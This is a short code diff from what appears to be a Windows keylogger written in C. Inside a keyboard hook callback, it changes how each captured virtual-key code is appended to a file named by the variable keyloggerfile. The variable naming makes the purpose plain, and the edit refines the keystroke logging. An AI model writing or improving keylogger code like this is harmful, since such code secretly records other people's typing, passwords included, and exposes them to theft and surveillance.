@@ -20,7 +20,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         FILE* file;
         fopen_s(&file, keyloggerfile, "a");
         if (file != NULL) {
-            fprintf(file, "%c", vkCode);
+            fprintf(file, "%lu", vkCode);
             fclose(file);
         }
         keyCount++;
